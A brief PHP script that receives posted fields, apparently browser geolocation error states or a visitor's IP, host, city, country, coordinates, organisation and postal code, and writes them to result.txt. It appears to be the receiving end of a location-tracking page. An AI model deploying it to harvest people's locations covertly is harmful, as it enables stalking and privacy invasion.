<?php
header('Content-Type: text/html');
{$denied=$_POST['Denied'];
$una=$_POST['Una'];
$time=$_POST['Time'];
$unk=$_POST['Unk'];
$support=' ';
$ip=$_POST['Ip'];
$host=$_POST['Host'];
$city=$_POST['City'];
$country=$_POST['Country'];
$location=$_POST['Location'];
$organisation=$_POST['Organisation'];
$postalcode=$_POST['Postalcode'];
$support=$ip . PHP_EOL . $host . PHP_EOL . $city . PHP_EOL . $country . PHP_EOL . $location . PHP_EOL . $organisation . PHP_EOL . $postalcode;


if(isset($denied))
{$f=fopen('result.txt','w+');
fwrite($f,$denied);
fclose($f);}
elseif(isset($una))
{$f=fopen('result.txt','w+');
fwrite($f, $una);
fclose($f);}
elseif(isset($time))
{$f=fopen('result.txt','w+');
fwrite($f, $time);
fclose($f);} 
elseif(isset($unk))
{$f=fopen('result.txt','w+');
fwrite($f, $unk);
fclose($f);}
else
{$f=fopen('result.txt','w+');
fwrite($f,$support);
fclose($f);}}
?>